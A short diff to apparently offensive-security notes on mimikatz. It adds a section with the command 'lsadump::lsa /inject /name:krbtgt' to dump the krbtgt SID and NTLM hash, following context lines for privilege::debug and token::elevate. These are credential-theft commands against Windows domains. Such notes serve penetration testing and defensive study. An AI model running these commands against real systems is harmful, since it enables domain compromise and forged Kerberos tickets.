@@ -25,3 +25,12 @@ mimikatz # privilege::debug
 mimikatz # token::elevate
 ```
 
+
+### Dumping the SID and NTLM hash
+
+```powershell
+# Dump the sid and NTLM hash of the krbtgt user
+mimikatz # lsadump::lsa /inject /name:krbtgt
+```
+
+
